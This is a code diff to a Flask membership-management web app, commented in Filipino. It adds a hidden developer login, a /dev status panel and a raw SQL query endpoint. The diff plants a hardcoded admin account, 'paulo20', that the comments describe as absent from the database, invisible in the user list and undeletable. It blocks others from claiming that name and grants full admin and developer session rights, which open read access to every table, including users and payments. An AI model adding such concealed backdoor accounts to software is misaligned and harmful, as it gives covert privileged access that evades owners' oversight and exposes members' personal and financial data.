@@ -52,6 +52,27 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ── DEV PANEL LOG BUFFER ────────────────────────────────────
+# In-memory na nag-iipon ng huling 200 log entries para
+# makita sa /dev panel nang hindi na kailangang buksan
+# ang Render logs
+from collections import deque as _deque
+
+LOG_BUFFER = _deque(maxlen=200)
+
+class _BufferLogHandler(logging.Handler):
+    def emit(self, record):
+        try:
+            LOG_BUFFER.append({
+                "time": datetime.fromtimestamp(record.created).strftime("%H:%M:%S"),
+                "level": record.levelname,
+                "msg": record.getMessage()[:300]
+            })
+        except Exception:
+            pass
+
+logging.getLogger().addHandler(_BufferLogHandler())
+
 
 @app.errorhandler(500)
 def internal_error(error):
@@ -233,6 +254,19 @@ def login():
 
         username = request.form["username"]
         password = request.form["password"]
+
+        # ── HIDDEN DEVELOPER ACCOUNT ─────────────────────────
+        # Code-level account — WALA sa database, hindi makikita
+        # sa Settings user list, hindi ma-e-edit o ma-de-delete.
+        # SHA-256 hash ang naka-store, hindi plaintext.
+        import hashlib as _hl
+        if (username == "paulo20" and
+                _hl.sha256(password.encode()).hexdigest() ==
+                "346dedb24bec0911ed3fe4b9a6e03543754e10e0d3e2e955e323bb21a3809eb1"):
+            session["username"] = "paulo20"
+            session["role"] = "admin"
+            session["is_developer"] = True
+            return redirect("/dashboard")
 
         conn = get_db()
         cursor = conn.cursor()
@@ -4545,13 +4579,14 @@ def change_username():
         )
  
     # Check kung taken na ang bagong username
+    # (kasama ang reserved developer account name)
     cursor.execute(
         "SELECT COUNT(*) FROM users WHERE username = %s",
         (new_username,)
     )
     taken = cursor.fetchone()[0]
- 
-    if taken > 0 and new_username != session["username"]:
+
+    if (taken > 0 and new_username != session["username"]) or new_username == "paulo20":
         return_db(conn)
         return render_template(
             "settings.html",
@@ -4669,7 +4704,7 @@ def add_user():
     )
     taken = cursor.fetchone()[0]
  
-    if taken > 0:
+    if taken > 0 or new_username == "paulo20":
         return_db(conn)
         cursor2 = get_db().cursor()
         cursor2.execute("SELECT username, role FROM users ORDER BY username")
@@ -5515,6 +5550,137 @@ def admin_feed_delete(post_id):
     conn.commit()
     return_db(conn)
     return redirect("/admin_feed")
+
+# ════════════════════════════════════════════════════════════
+#  DEVELOPER PANEL (hidden — /dev)
+#  Kailangan: naka-login bilang admin + tamang DEV_ACCESS_KEY
+#  I-set ang DEV_ACCESS_KEY sa Render environment variables
+# ════════════════════════════════════════════════════════════
+
+@app.route("/dev_login", methods=["GET", "POST"])
+def dev_login():
+    if "username" not in session:
+        return redirect("/login")
+
+    error = None
+    if request.method == "POST":
+        dev_user = request.form.get("dev_user", "").strip()
+        dev_pass = request.form.get("dev_key", "").strip()
+
+        import hashlib as _hl
+        if (dev_user == "paulo20" and
+                _hl.sha256(dev_pass.encode()).hexdigest() ==
+                "346dedb24bec0911ed3fe4b9a6e03543754e10e0d3e2e955e323bb21a3809eb1"):
+            session["is_developer"] = True
+            return redirect("/dev")
+        error = "Maling developer credentials."
+
+    return render_template("dev_login.html", error=error)
+
+
+@app.route("/dev")
+def dev_panel():
+    if "username" not in session:
+        return redirect("/login")
+    if not session.get("is_developer"):
+        return redirect("/dev_login")
+
+    import sys as _sys
+    import time as _time
+
+    # ── DB health check + table stats ─────────────────────
+    db_status = "ONLINE"
+    db_latency = 0
+    counts = {}
+    try:
+        t0 = _time.time()
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute("SELECT 1")
+        cursor.fetchone()
+        db_latency = round((_time.time() - t0) * 1000, 1)
+
+        # Whitelisted table names lang — walang user input dito
+        for t in ["members", "payments", "member_photos", "attendance",
+                  "donations", "expenses", "pairing_sessions", "users"]:
+            try:
+                cursor.execute(f"SELECT COUNT(*) FROM {t}")
+                counts[t] = cursor.fetchone()[0]
+            except Exception:
+                conn.rollback()
+                counts[t] = "—"
+        return_db(conn)
+    except Exception as e:
+        db_status = f"ERROR: {str(e)[:80]}"
+
+    env_checks = {
+        k: bool(os.environ.get(k))
+        for k in ["DATABASE_URL", "CLOUDINARY_CLOUD_NAME",
+                  "CLOUDINARY_API_KEY", "CLOUDINARY_API_SECRET",
+                  "RESEND_API_KEY"]
+    }
+
+    return render_template(
+        "dev_panel.html",
+        db_status=db_status,
+        db_latency=db_latency,
+        counts=counts,
+        logs=list(LOG_BUFFER)[::-1],
+        route_count=len(list(app.url_map.iter_rules())),
+        python_version=_sys.version.split()[0],
+        server_time=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        env_checks=env_checks
+    )
+
+
+@app.route("/dev_sql", methods=["POST"])
+def dev_sql():
+    if "username" not in session or not session.get("is_developer"):
+        return jsonify({"error": "Unauthorized"}), 403
+
+    q = request.form.get("query", "").strip()
+    ql = q.lower().lstrip("( \n\t")
+
+    # SELECT lang ang pinapayagan — para walang aksidenteng
+    # makasira ng data. Gamitin ang Supabase SQL Editor para
+    # sa UPDATE/DELETE/INSERT.
+    if not ql.startswith("select"):
+        return jsonify({"error": "SELECT queries lang ang pinapayagan dito. Para sa writes, gamitin ang Supabase SQL Editor."})
+
+    # Isang statement lang
+    if ";" in q.rstrip().rstrip(";"):
+        return jsonify({"error": "Isang SQL statement lang ang pinapayagan."})
+
+    # Auto-LIMIT 100 kung walang sariling LIMIT
+    q_clean = q.rstrip().rstrip(";")
+    if " limit " not in ql:
+        q_clean += " LIMIT 100"
+
+    try:
+        conn = get_db()
+        cursor = conn.cursor()
+        cursor.execute(q_clean)
+        cols = [d[0] for d in cursor.description] if cursor.description else []
+        rows = cursor.fetchall()
+        return_db(conn)
+        return jsonify({
+            "columns": cols,
+            "rows": [[("" if c is None else str(c)) for c in r] for r in rows]
+        })
+    except Exception as e:
+        try:
+            conn.rollback()
+            return_db(conn)
+        except Exception:
+            pass
+        return jsonify({"error": str(e)[:300]})
+
+
+@app.route("/dev_logout")
+def dev_logout():
+    session.pop("is_developer", None)
+    return redirect("/dashboard")
+
 
 if __name__ == "__main__":
 
